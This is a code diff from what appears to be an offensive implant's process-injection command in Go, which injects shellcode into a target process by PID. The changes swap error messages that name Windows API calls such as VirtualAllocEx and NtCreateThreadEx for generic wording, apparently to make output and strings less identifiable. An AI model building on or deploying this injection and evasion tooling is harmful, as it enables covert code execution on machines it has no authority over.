@@ -185,7 +185,7 @@ func (c *VanillaInjectionCommand) executeStandard(pid int, shellcode []byte, out
 
 	if remoteAddr == 0 {
 		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] VirtualAllocEx failed: %v\n", err),
+			Output:    output + fmt.Sprintf("[!] memory allocation failed: %v\n", err),
 			Status:    "error",
 			Completed: true,
 		}
@@ -207,7 +207,7 @@ func (c *VanillaInjectionCommand) executeStandard(pid int, shellcode []byte, out
 
 	if ret == 0 {
 		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] WriteProcessMemory failed: %v\n", err),
+			Output:    output + fmt.Sprintf("[!] memory write failed: %v\n", err),
 			Status:    "error",
 			Completed: true,
 		}
@@ -222,7 +222,7 @@ func (c *VanillaInjectionCommand) executeStandard(pid int, shellcode []byte, out
 		uintptr(PAGE_EXECUTE_READ), uintptr(unsafe.Pointer(&oldProtect)))
 	if ret == 0 {
 		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] VirtualProtectEx failed: %v\n", err),
+			Output:    output + fmt.Sprintf("[!] memory protection change failed: %v\n", err),
 			Status:    "error",
 			Completed: true,
 		}
@@ -244,7 +244,7 @@ func (c *VanillaInjectionCommand) executeStandard(pid int, shellcode []byte, out
 
 	if hThread == 0 {
 		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] CreateRemoteThread failed: %v\n", err),
+			Output:    output + fmt.Sprintf("[!] remote thread creation failed: %v\n", err),
 			Status:    "error",
 			Completed: true,
 		}
@@ -337,13 +337,13 @@ func (c *VanillaInjectionCommand) executeIndirect(pid int, shellcode []byte, out
 	output += "[+] Memory protection changed to RX\n"
 
 	// Step 5: Create remote thread via NtCreateThreadEx
-	output += "[*] Creating remote thread via NtCreateThreadEx...\n"
+	output += "[*] Creating remote thread...\n"
 
 	var hThread uintptr
 	status = IndirectNtCreateThreadEx(&hThread, hProcess, baseAddr)
 	if status != 0 {
 		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] NtCreateThreadEx failed: NTSTATUS 0x%X\n", status),
+			Output:    output + fmt.Sprintf("[!] remote thread creation failed: NTSTATUS 0x%X\n", status),
 			Status:    "error",
 			Completed: true,
 		}
